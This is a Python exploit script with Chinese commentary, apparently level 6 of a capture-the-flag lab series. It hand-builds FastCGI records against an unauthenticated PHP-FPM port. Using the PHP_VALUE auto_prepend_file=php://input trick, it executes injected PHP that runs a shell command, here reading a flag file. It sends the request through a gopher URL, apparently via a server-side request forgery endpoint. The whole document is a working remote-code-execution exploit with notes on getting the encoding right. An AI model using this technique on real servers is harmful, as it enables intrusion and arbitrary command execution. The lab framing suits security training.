"""L6 · 打 PHP-FPM 的 FastCGI 端口

php-fpm 只监听 TCP 9000，没有认证。能连上 9000 的人就能以 fpm worker
的身份执行 PHP —— nginx 那层转发在这里完全不参与。

一个最小请求需要三条记录：
    BEGIN_REQUEST(1) → PARAMS(4) → STDIN(5)
PARAMS 和 STDIN 结束后各补一条空记录。

核心利用点：
    PHP_VALUE = auto_prepend_file=php://input
fpm 会在执行 index.php 之前把 php://input（也就是我们 STDIN 里的内容）
include 进来。前提是 allow_url_include=On，靶场的 fpm 容器里已经开了。

**最容易拼错的地方**：name-value 对是两个长度字段连在一起，
然后才是 name 和 value：
    nameLen(1) + valueLen(1) + name + value
写成「名字长度 + 名字 + 值长度 + 值」的话，fpm 会直接 RST 掉连接，
页面上只看到「空响应」，日志里什么都没有。

跑法：
    python3 06_fastcgi_gopher.py
"""

import struct
import sys

from _util import gopher_url, report, send

PHP = "<?php system('cat /flag_l6'); ?>"


def record(rtype, content, req_id=1):
    """FastCGI 记录：8 字节头 + 内容。"""
    return struct.pack(">BBHHBB", 1, rtype, req_id, len(content), 0, 0) + content


def params(pairs):
    out = b""
    for k, v in pairs:
        k, v = k.encode(), v.encode()
        out += bytes([len(k)]) + bytes([len(v)]) + k + v
    return out


def build():
    pairs = [
        ("GATEWAY_INTERFACE", "CGI/1.1"),
        ("REQUEST_METHOD", "POST"),
        ("SCRIPT_FILENAME", "/var/www/html/index.php"),
        ("SCRIPT_NAME", "/index.php"),
        ("REQUEST_URI", "/index.php"),
        ("DOCUMENT_ROOT", "/var/www/html"),
        ("SERVER_PROTOCOL", "HTTP/1.1"),
        ("SERVER_SOFTWARE", "nginx"),
        ("REMOTE_ADDR", "127.0.0.1"),
        ("CONTENT_TYPE", "application/text"),
        ("CONTENT_LENGTH", str(len(PHP))),
        ("PHP_VALUE", "auto_prepend_file=php://input"),
    ]
    return (
        record(1, struct.pack(">HBxxxxx", 1, 0))  # role=RESPONDER, flags=0
        + record(4, params(pairs))
        + record(4, b"")            # PARAMS 结束
        + record(5, PHP.encode())
        + record(5, b"")            # STDIN 结束
    )


def main():
    payload = build()
    print("payload 共 %d 字节" % len(payload))
    print("BEGIN_REQUEST:", payload[:16].hex(" "))
    print()

    body = send("l6.php", gopher_url("fpm", 9000, payload))
    return 0 if report(body) else 1


if __name__ == "__main__":
    sys.exit(main())
